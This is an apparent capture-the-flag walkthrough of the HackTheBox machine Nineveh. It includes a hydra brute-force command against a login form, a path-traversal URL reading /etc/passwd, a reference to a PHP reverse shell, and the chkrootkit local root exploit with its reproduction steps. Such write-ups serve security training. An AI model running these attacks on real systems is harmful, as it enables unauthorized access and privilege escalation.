# Nineveh

## Machine Info

![Nineveh](./Nineveh.assets/Nineveh.png)

## Recon

- nmap

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|5.X (90%), Crestron 2-Series (86%), Google Android 4.X (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:google:android:4.0 cpe:/o:linux:linux_kernel:5.0 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 - 4.6 (90%), Linux 3.2 - 4.9 (90%), Linux 3.8 - 3.11 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 4.8 (90%)
No exact OS matches for host (test conditions non-ideal).
```

- 80 http, 443 https
- path scan

![image-20231213074518595](./Nineveh.assets/image-20231213074518595.png)

![image-20231213074521977](./Nineveh.assets/image-20231213074521977.png)

![image-20231213075217706](./Nineveh.assets/image-20231213075217706.png)

- http://nineveh.htb/department/login.php
- https://nineveh.htb/db/index.php

## Foothold

### brute force

- login page

![image-20231213075302426](./Nineveh.assets/image-20231213075302426.png)

![image-20231213075306493](./Nineveh.assets/image-20231213075306493.png)

- hint: -> user admin, amrois

```
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
```

- `hydra -L user -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:F=Invalid"`

![image-20231213075339485](./Nineveh.assets/image-20231213075339485.png)

- https://nineveh.htb/db/index.php

![image-20231213075415732](./Nineveh.assets/image-20231213075415732.png)

### LFI

- check param

![image-20231213075445932](./Nineveh.assets/image-20231213075445932.png)

- direct LFI [x]

![image-20231213075457372](./Nineveh.assets/image-20231213075457372.png)

- guess matcher `ninevehNotes` is crucial

![image-20231213075530181](./Nineveh.assets/image-20231213075530181.png)

- http://nineveh.htb/department/manage.php?notes=/ninevehNotes_qwe/../../../../etc/passwd

![image-20231213075613086](./Nineveh.assets/image-20231213075613086.png)

### 24040

- POC

![image-20231213075643118](./Nineveh.assets/image-20231213075643118.png)

![image-20231213075647745](./Nineveh.assets/image-20231213075647745.png)

- change poc content into php reverse shell -> get www-data shell

![image-20231213075707289](./Nineveh.assets/image-20231213075707289.png)

![image-20231213075714988](./Nineveh.assets/image-20231213075714988.png)

## Privilege Escalation

### www-data -> root

- pspy -> find root scheduled task

![image-20231213075842747](./Nineveh.assets/image-20231213075842747.png)

- `/usr/bin/chkrootkit` -> searchsploit

![image-20231213075859715](./Nineveh.assets/image-20231213075859715.png)

- **33899**

```bash
for i in ${SLAPPER_FILES}; do
  if [ -f ${i} ]; then
     file_port=$file_port $i
     STATUS=1
  fi
done
```

```
The line 'file_port=$file_port $i' will execute all files specified in
$SLAPPER_FILES as the user chkrootkit is running (usually root), if
$file_port is empty, because of missing quotation marks around the
variable assignment.

Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.
```

![image-20231213075944970](./Nineveh.assets/image-20231213075944970.png)

### www-data -> amrois

- check linpeas output -> find mail text; or find knockd process

![image-20231213080203924](./Nineveh.assets/image-20231213080203924.png)

![image-20231213080223840](./Nineveh.assets/image-20231213080223840.png)

- check knock's config file

![image-20231213080235189](./Nineveh.assets/image-20231213080235189.png)

- knock on the local host, `knock $IP 571 290 911` or `for x in 571 290 911;do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done`

- sensitive image: `/var/www/ssl/secure_notes/nineveh.png`, find hidden text
- by **strings**

![image-20231213080401206](./Nineveh.assets/image-20231213080401206.png)

- by **binwalk**

![image-20231213080407435](./Nineveh.assets/image-20231213080407435.png)

## Exploit Chain

recon -> path scan -> username leakage -> brute force cred -> LFI -> RCI -> get www-data shell -> sensitive img, knockd process, sensitive email -> amoris cred -> ssh conn after knocking -> root's scheduled task exploit
